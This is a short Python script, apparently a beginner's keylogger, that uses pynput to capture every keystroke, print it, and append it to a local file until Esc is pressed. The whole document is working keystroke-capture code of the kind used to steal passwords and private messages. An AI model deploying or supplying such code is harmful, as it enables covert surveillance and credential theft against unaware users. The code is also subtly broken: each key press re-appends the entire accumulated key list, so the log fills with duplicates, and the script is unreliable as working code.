from pynput.keyboard import Key, Listener

# this is a list to store pressed keys
keys = []

# by these line the function will handle key press events.
def on_press(key):
    keys.append(key)
    write_keys(keys)
    print(key)

# Function to write keystrokes to file
def write_keys(key_list):
    with open("keystrokes.txt", "a") as file:
        for k in key_list:
            formatted_key = str(k).replace("'", "")
            file.write(formatted_key + " ")

# Function to handle key release events
def on_release(key):
    if key == Key.esc:
        return False

#listener starting here
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
